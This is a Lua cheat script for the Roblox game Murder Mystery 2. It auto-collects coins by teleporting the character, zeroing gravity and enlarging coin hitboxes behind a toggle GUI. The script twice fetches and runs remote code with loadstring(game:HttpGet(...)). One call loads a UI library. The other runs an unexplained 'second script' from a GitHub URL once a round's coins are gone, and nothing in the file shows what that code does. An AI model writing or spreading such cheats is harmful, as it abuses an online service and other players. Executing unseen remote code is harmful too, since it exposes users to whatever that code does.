local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local oldgravity = workspace.Gravity
-- Lock variable to prevent multiple script executions
local isRunning = false
local coinCollectorThread
local hasReset = false -- Flag to track if the character has been reset
local hasExecutedOnce = false -- Flag to ensure second script executes only once

-- Default tween speed
local TWEEN_SPEED = 25
local TELEPORT_DISTANCE = 200

-- Function to execute the coin collection script
local function startCoinCollector()
    if isRunning then return end
    isRunning = true

    -- Get the local player
    local localPlayer = Players.LocalPlayer

    -- Function to get the current character and ensure it's fully loaded
    local function getCharacter()
        return localPlayer.Character or localPlayer.CharacterAdded:Wait()
    end

    -- Initialize character and humanoidRootPart
    local function initializeCharacter()
        local character = getCharacter()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
        local humanoid = character:WaitForChild("Humanoid", 5)
        return character, humanoidRootPart, humanoid
    end

    -- Variables for character and humanoid
    local character, humanoidRootPart, humanoid = initializeCharacter()

    if not humanoidRootPart then
        warn("HumanoidRootPart not found!")
        isRunning = false
        return
    end

    if not humanoid then
        warn("Humanoid not found!")
        isRunning = false
        return
    end

    -- List of possible maps and their CoinContainer paths
    local mapPaths = {
        "BeachResort",
        "Yacht",
        "IceCastle",
        "SkiLodge",
        "Station",
        "LogCabin",
        "Bank2",
        "BioLab",
        "House2",
        "Factory",
        "Hospital3",
        "Hotel",
        "Mansion2",
        "MilBase",
        "Office3",
        "PoliceStation",
        "Workplace",
        "ResearchFacility",
        "ChristmasItaly"
    }

    -- Keep track of visited coins to prevent revisiting
    local visitedCoins = {}

    -- Function to find the active map's CoinContainer
    local function findActiveCoinContainer()
        for _, mapName in ipairs(mapPaths) do
            local map = Workspace:FindFirstChild(mapName)
            if map then
                local coinContainer = map:FindFirstChild("CoinContainer")
                if coinContainer then
                    return coinContainer
                end
            end
        end
        return nil
    end

    -- Function to find the nearest coin
    local function findNearestCoin(coinContainer)
        local nearestCoin = nil
        local shortestDistance = math.huge

        if coinContainer then
            for _, coin in ipairs(coinContainer:GetChildren()) do
                if coin:IsA("BasePart") and not visitedCoins[coin] then
                    local distance = (humanoidRootPart.Position - coin.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearestCoin = coin
                    end
                end
            end
        else
            warn("CoinContainer not found or empty!")
        end

        return nearestCoin
    end

    -- Function to teleport to a coin
    local function teleportToCoin(coin)
        if coin then
            workspace.Gravity = 0
            humanoidRootPart.CFrame = CFrame.new(coin.Position - Vector3.new(0,6,0))
            visitedCoins[coin] = true -- Mark the coin as visited
        else
            warn("No coin to teleport to!")
            workspace.Gravity = oldgravity
        end
    end

    -- Function to tween to a coin
    local function tweenToCoin(coin)
        if coin then
            visitedCoins[coin] = true -- Mark the coin as visited
            local distance = (humanoidRootPart.Position - coin.Position).Magnitude
            local tweenInfo = TweenInfo.new(distance / TWEEN_SPEED, Enum.EasingStyle.Linear)
            local goal = {CFrame = CFrame.new(coin.Position - Vector3.new(0,6,0))}
            local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
            tween:Play()

            -- When the tween starts, enable auto reset
            hasReset = false -- Allow reset once the tween starts

            tween.Completed:Wait() -- Wait for the tween to finish
        else
            warn("No coin to tween to!")
        end
    end

    -- Function to play falling animation
    local function playFallingAnimation()
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
    end

    -- Function to check if all CoinVisuals are gone and reset character
    local function checkForAllCoinVisualsGone()
        local coinContainer = findActiveCoinContainer()

        if coinContainer then
            local allCoinVisualsGone = true

            -- Check if any coin still has a CoinVisual
            for _, coin in ipairs(coinContainer:GetChildren()) do
                if coin:IsA("BasePart") then
                    local coinVisual = coin:FindFirstChild("CoinVisual")
                    if coinVisual then
                        allCoinVisualsGone = false
                        break
                    end
                end
            end

            -- If all CoinVisuals are gone and the character has not reset, reset the character

            -- If all CoinVisuals are gone, execute the second script once
            if allCoinVisualsGone and not hasExecutedOnce then
                hasExecutedOnce = true
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezqhs/-/refs/heads/main/auxqvoa"))()
            end

            -- Stop teleporting and tweening if all CoinVisuals are gone
            if allCoinVisualsGone then
                isRunning = false
            end
        end
    end

    -- Main function to tween or teleport to nearest coins
    local function collectCoins()
        while isRunning do
            -- Ensure the character and humanoid are initialized
            if not character or not humanoidRootPart or not humanoid or not character.Parent then
                character, humanoidRootPart, humanoid = initializeCharacter()
            end

            -- Find the active map's CoinContainer
            local coinContainer = findActiveCoinContainer()
            if not coinContainer then
                warn("No active map with a CoinContainer found. Retrying...")
                wait(0.01)
                continue
            end

            -- Find the nearest coin
            local targetCoin = findNearestCoin(coinContainer)
            if not targetCoin then
                warn("No unvisited coins available in the active map. Retrying...")
                wait(0.01)
                continue
            end

            -- Check if all CoinVisuals are gone and stop if necessary
            checkForAllCoinVisualsGone()
            if not isRunning then break end -- Stop the loop if all CoinVisuals are gone

            -- Check distance and decide whether to teleport or tween
            local distanceToCoin = (humanoidRootPart.Position - targetCoin.Position).Magnitude
            if distanceToCoin >= TELEPORT_DISTANCE then
                teleportToCoin(targetCoin)
            else
                tweenToCoin(targetCoin)
            end

            -- Play falling animation during tween
            playFallingAnimation()

            -- Check if all CoinVisuals are gone and reset if necessary
            checkForAllCoinVisualsGone()

            wait(0.01) -- Add a small wait to prevent script from running too quickly
        end
    end

    -- Start the coin collection process
    collectCoins()
end

-- Function to stop the coin collector
local function stopCoinCollector()
    isRunning = false
    if coinCollectorThread then
        coinCollectorThread:Disconnect()
        coinCollectorThread = nil
    end
end

-- Function to handle new round detection (this is just an example, adjust as needed)
local function onNewRound()
    -- Reset the hasReset flag when a new round starts
    hasReset = false
    hasExecutedOnce = false -- Allow the second script to execute again in the new round

    -- Start the coin collector again
    if not isRunning then
        coinCollectorThread = game:GetService("RunService").Heartbeat:Connect(startCoinCollector)
    end
end

-- GUI to toggle auto farm and speed
local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
local Window = Library:NewWindow("ðŸŒ… Summer - MM2")
local KillingCheats = Window:NewSection("Farm")
local Credit = Window:NewSection("Credit")

-- Toggle for Auto Farm
KillingCheats:CreateToggle("Auto Farm", function(value)
if value then
workspace.Gravity = 0
if not isRunning then
coinCollectorThread = game:GetService("RunService").Heartbeat:Connect(startCoinCollector)
end
for _,v in ipairs(workspace:GetDescendants()) do
if v.Name == "Coin_Server" and v then
v.Size = Vector3.new(10,30,10)
end
end
BigCoins = workspace.DescendantAdded:Connect(function(v)
if v.Name == "Coin_Server" and v then
v.Size = Vector3.new(10,30,10)
end
end)
else
workspace.Gravity = oldgravity
stopCoinCollector()
BigCoins:Disconnect()
for _,v in ipairs(workspace:GetDescendants()) do
if v.Name == "Coin_Server" and v then
v.Size = Vector3.new(1, 2, 1)
end
end
end
end)
Credit:CreateButton("bá»Ÿi Thanh Tiáº¿n", function()
end)
-- Connect to a new round event (example, adjust as needed)
ReplicatedStorage.Remotes.Gameplay.NewRound.OnClientEvent:Connect(onNewRound)
